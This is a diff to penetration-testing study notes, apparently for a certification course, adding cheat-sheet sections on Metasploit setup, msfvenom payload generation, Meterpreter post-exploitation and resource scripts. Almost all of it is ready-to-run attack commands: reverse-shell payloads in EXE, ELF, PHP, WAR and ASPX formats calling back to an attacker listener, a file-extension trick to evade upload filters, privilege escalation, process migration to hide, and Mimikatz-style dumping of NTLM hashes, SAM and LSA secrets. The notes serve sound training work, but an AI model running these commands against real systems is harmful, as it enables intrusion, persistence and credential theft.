@@ -325,38 +325,198 @@ If the target is behind a pivot/jump host, set `LHOST` to the internal IP of the
 
 ---
 
-## Metasploit Session Management
+## Metasploit Framework — Setup and Session Management
 
 ```bash
-# Launch with DB for scan storage
-sudo msfdb run
+# DB init (required once; start postgresql first if reinit needed)
+sudo systemctl start postgresql
+sudo msfdb init           # first time
+sudo msfdb reinit         # if init breaks (ActiveRecord/migration errors)
+sudo msfconsole -q        # quiet launch
+sudo msfconsole -r script.rc   # launch and execute resource script
 
-# Run Nmap from within msfconsole (results auto-stored)
+# DB status + workspace
+db_status
+workspace -a pen200       # create + switch to workspace
+workspace pen200          # switch to existing
+
+# DB-backed recon
 db_nmap -A --top-ports 60 -T5 TARGET_IP
-hosts          # query stored hosts
-services       # query stored services
+hosts          # stored hosts
+services [-p 445]          # stored services; filter by port
+services -p 445 --rhosts   # set RHOSTS from DB results automatically
+vulns          # vulnerabilities identified by modules
+creds          # stored credentials (user/pass/hash)
 
-# Set option globally for all modules
-setg LHOST tun0    # persists when switching modules
+# Global options (persist when switching modules)
+setg LHOST tun0
 unsetg LHOST
 
-# Background an active session (keeps it alive)
-background     # or: Ctrl+Z
+# Module workflow
+search type:exploit smb
+use 5                      # by index or full path
+info                       # check side-effects, stability, reliability
+show options | show missing | show payloads | show advanced
+check                      # dry-run if supported
+run | run -j | run -z -j   # run / background job / job + no auto-interact
 
-# List and interact with sessions
-sessions           # show all
-sessions -i 1      # attach to session 1
-sessions -k 1      # kill session 1
+# Session management
+sessions -l                # list all
+sessions -i 1              # attach to session 1
+sessions -k 1              # kill session 1
+background                 # or Ctrl+Z — background current session/channel
+jobs                       # list background jobs
 
-# Run a local exploit against an existing session
-use exploit/linux/local/sudo_baron_samedit
-set SESSION 1      # the existing session ID
-set LPORT 9001     # change from 4444 to avoid port conflict with original handler
+# Use a post module against an existing session
+use post/windows/gather/enum_hostfile
+set SESSION 1
 run
 ```
 
-🔁 [[Using the Metasploit Framework (HTB Supplementary)#MSF.1. MSF Database Setup|MSF.1]], [[Using the Metasploit Framework (HTB Supplementary)#MSF.3. Session Management|MSF.3]]
+Cross-link: [[The Metasploit Framework#21.1.1 Setup and Work with MSF|Module 21 §21.1.1]]
 
-#### Tags: #Metasploit #msfdb #dbNmap #SessionManagement #setg #background
+#### Tags: #Metasploit #msfdb #dbNmap #SessionManagement #setg #background #Module21
 
-*(`msfvenom` syntax for generating shellcode/payloads lives in [[Buffer Overflow & Memory Corruption#msfvenom: Generating Shellcode for a BOF Payload|Buffer Overflow & Memory Corruption]], where it was first taught in depth, since [[Fixing Exploits]] is where bad-char/encoder/format flags actually mattered.)*
+---
+
+## msfvenom — Payload Generation
+
+```bash
+# List payloads (optionally filter)
+msfvenom -l payloads
+msfvenom -l payloads --platform windows --arch x64
+
+# Windows reverse shell EXE (non-staged: underscore)
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.x LPORT=443 -f exe -o shell.exe
+
+# Windows staged reverse shell EXE (staged: slash — needs multi/handler)
+msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.x LPORT=443 -f exe -o staged.exe
+
+# Windows x64 Meterpreter EXE (staged)
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.45.x LPORT=443 -f exe -o met.exe
+
+# Linux ELF reverse shell
+msfvenom -p linux/x64/shell_reverse_tcp LHOST=192.168.45.x LPORT=443 -f elf -o shell.elf
+
+# Linux Meterpreter ELF
+msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=192.168.45.x LPORT=443 -f elf -o met.elf
+
+# PHP reverse shell (raw output — rename to .pHP to bypass extension filters)
+msfvenom -p php/reverse_php LHOST=192.168.45.x LPORT=443 -f raw -o shell.pHP
+
+# Tomcat WAR reverse shell
+msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.45.x LPORT=443 -f war -o shell.war
+
+# ASPX reverse shell
+msfvenom -p windows/x64/shell_reverse_tcp LHOST=192.168.45.x LPORT=443 -f aspx -o shell.aspx
+```
+
+| Flag | Purpose |
+|---|---|
+| `-p` | Payload path |
+| `LHOST=` | Listener IP |
+| `LPORT=` | Listener port |
+| `-f` | Format: `exe` `elf` `raw` `war` `aspx` `ps1` |
+| `-o` | Output file |
+| `-l payloads` | List payloads |
+| `--platform` | Filter by platform |
+| `--arch` | Filter by arch |
+
+> Staged payloads (slash notation: `shell/reverse_tcp`) require `multi/handler` to send stage 2. Non-staged (underscore: `shell_reverse_tcp`) work with plain nc.
+
+Cross-link: [[The Metasploit Framework#21.2.3 Executable Payloads|Module 21 §21.2.3]]
+
+#### Tags: #msfvenom #Metasploit #StagedPayloads #PayloadGeneration #Module21
+
+---
+
+## Meterpreter — Core Post-Exploitation
+
+```bash
+# Situational awareness
+sysinfo          # OS, arch, hostname, Meterpreter type
+getuid           # current user
+getpid           # PID of Meterpreter payload
+idletime         # how long since user last active (safe to run noisy ops if high)
+ps               # full process list: PID, PPID, name, arch, session, user, path
+
+# Privilege escalation
+getsystem        # auto-escalate to SYSTEM (tries Named Pipe, token duplication, etc.)
+getuid           # confirm SYSTEM
+
+# Process migration (hide in legitimate process)
+ps
+migrate 8052                  # inject into PID 8052
+execute -H -f notepad         # spawn hidden Notepad to migrate into
+migrate <new-PID>
+
+# File system (l-prefix = local Kali operations)
+pwd / lpwd
+ls / lls
+cd / lcd
+download /etc/passwd
+upload /usr/local/tools/linpeas.sh /tmp/
+search -f passwords*          # search remote FS by filename pattern
+lcat /home/kali/output.txt    # read a local file to screen
+
+# Shell + channels
+shell                         # drop into OS shell (creates a channel)
+channel -l                    # list channels
+channel -i 1                  # interact with channel 1
+# Ctrl+Z to background back to Meterpreter prompt
+
+# Kiwi (Mimikatz in-process — requires SYSTEM)
+load kiwi
+creds_msv          # dump NTLM hashes from LSASS
+creds_all          # dump all credential types
+lsa_dump_sam       # SAM hive dump
+lsa_dump_secrets   # LSA secrets
+
+# Environment variables
+getenv FLAG        # read an env var by name
+
+# Port forwarding (single-service, no proxychains needed)
+portfwd add -l 3389 -p 3389 -r 172.16.5.200
+portfwd list
+# Kali's 127.0.0.1:3389 now maps to 172.16.5.200:3389
+
+# Run post modules against current session
+run post/windows/gather/enum_hostfile
+```
+
+Cross-link: [[The Metasploit Framework#21.3 Performing Post-Exploitation with Metasploit|Module 21 §21.3]]
+
+#### Tags: #Meterpreter #PostExploitation #getsystem #Kiwi #Mimikatz #portfwd #Module21
+
+---
+
+## Resource Scripts (.rc files)
+
+```bash
+# listener.rc — auto-migrating handler that keeps listening
+use exploit/multi/handler
+set PAYLOAD windows/x64/meterpreter_reverse_https
+set LHOST 192.168.45.x
+set LPORT 443
+set AutoRunScript post/windows/manage/migrate   # auto-migrate on session open
+set ExitOnSession false                          # keep listening after first hit
+run -z -j                                        # background job, no auto-interact
+```
+
+```bash
+# Launch MSF with a resource script:
+sudo msfconsole -r listener.rc
+
+# Or from inside msfconsole:
+resource /path/to/listener.rc
+
+# Pre-built scripts (examine before running):
+ls /usr/share/metasploit-framework/scripts/resource/
+# portscan.rc, auto_brute.rc, smb_checks.rc, run_all_post.rc
+```
+
+> `AutoRunScript` and `ExitOnSession` are **advanced options** — not visible in `show options`. Use `show advanced` to see them.
+
+Cross-link: [[The Metasploit Framework#21.4.1 Resource Scripts|Module 21 §21.4.1]]
+
+#### Tags: #ResourceScripts #Metasploit #AutoRunScript #ExitOnSession #Module21
